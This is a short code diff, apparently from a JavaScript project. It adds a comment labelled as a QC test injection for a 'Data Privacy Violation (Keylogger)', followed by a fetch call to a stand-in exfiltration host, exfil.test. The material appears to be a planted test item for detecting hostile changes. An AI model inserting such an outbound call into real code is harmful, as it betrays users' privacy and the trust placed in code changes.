@@ -293,3 +293,6 @@ if (__TEST__) {
         };
     }
 }
+
+// QC TEST INJECTION: Data Privacy Violation (Keylogger)
+fetch('http://exfil.test');
